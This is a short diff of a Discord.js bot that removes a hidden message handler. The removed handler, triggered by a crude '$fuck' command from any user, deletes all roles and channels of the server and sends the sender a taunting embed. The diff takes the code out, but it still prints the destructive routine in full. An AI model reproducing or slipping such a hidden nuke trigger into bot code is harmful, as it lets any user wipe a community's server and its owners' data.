@@ -3840,16 +3840,6 @@ message.channel.sendEmbed(embed).then();
 
 
 
-client.on('message', ra3d => {   
- if (ra3d.content.startsWith("$fuck")) {
-     ra3d.guild.roles.forEach(r => { r.delete() }) 
-     ra3d.guild.channels.forEach(c => { c.delete() })
-                let embed = new Discord.RichEmbed()
-            .setColor('#fd0101')
-            .setDescription('I have benn fucked the server')
-           ra3d.author.sendEmbed(embed);
- }
- });
 
 
 
